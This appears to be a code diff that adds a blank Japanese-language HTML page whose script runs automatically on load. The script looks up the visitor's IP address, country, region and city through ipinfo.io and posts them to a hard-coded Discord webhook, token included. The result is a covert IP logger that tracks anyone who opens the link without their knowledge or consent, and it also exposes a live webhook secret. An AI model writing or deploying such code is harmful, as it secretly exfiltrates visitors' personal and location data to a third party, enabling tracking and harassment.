@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IPアドレスをDiscordに送信する</title>
+    <script>
+        // DiscordのWebhookに情報を送信する関数
+        function sendToDiscord(ipInfo) {
+            const webhookURL = 'https://discord.com/api/webhooks/1230114925003800607/e8XeTPyQDveam4bXLq0ars676zqwJB-057PySpHpFLFUaDb4zgZArVIB1HwGlBVK_tKs';
+            const payload = {
+                embeds: [{
+                    title: '位置情報',
+                    description: `
+                        **IPアドレス**: \`${ipInfo.ip}\`
+                        **国**: \`${ipInfo.country}\`
+                        **県**: \`${ipInfo.region}\`
+                        **市**: \`${ipInfo.city}\`
+                    `,
+                    color: 3447003 // 青色
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Discordへの送信に失敗しました:', response.statusText);
+                } else {
+                    alert('✅');
+                }
+            })
+            .catch(error => console.error('Discordへの送信に失敗しました:', error));
+        }
+
+        // IPアドレスを取得して情報をDiscordに送信する関数
+        function sendIPAddressToDiscord() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    sendToDiscord(data); // 取得した情報をDiscordに送信
+                })
+                .catch(error => console.error('IP情報の取得に失敗しました:', error));
+        }
+
+        // ページが読み込まれた時に自動的に実行する
+        window.onload = function() {
+            sendIPAddressToDiscord();
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
